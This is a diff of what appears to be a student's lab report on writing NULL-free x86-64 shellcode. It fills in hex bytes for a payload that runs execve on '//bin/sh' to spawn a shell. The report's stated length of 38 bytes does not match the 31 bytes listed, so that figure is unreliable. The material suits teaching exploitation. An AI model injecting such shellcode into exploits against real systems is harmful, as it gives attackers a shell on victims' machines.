@@ -38,6 +38,7 @@ outside the file. In addition `_start` is the entry point for the code. Also the
 
 ## 3) Report on how many bytes total are in your assembly, and include the whole thing in ascii
 
-My shellcode is _ bytes long. Here they are: -- 48 31 d2 48 31 f6 48 b8 2f 62 69 6e 2f 73 68 00 50 48 89 e7 b8 3b 00 00 00 0f 05
+My shellcode is 38 bytes long. Here they are: 48 31 c0 48 31 ff b0 3b 57 48 bf 2f 2f 62 69 6e 2f 73 68 57 48 89 e7 48 31 f6 48 31 d2 0f 05 
+**ASCII:** 
 
 ## 4) Explanation of what I did to ensure there were no NULL bytes in my code
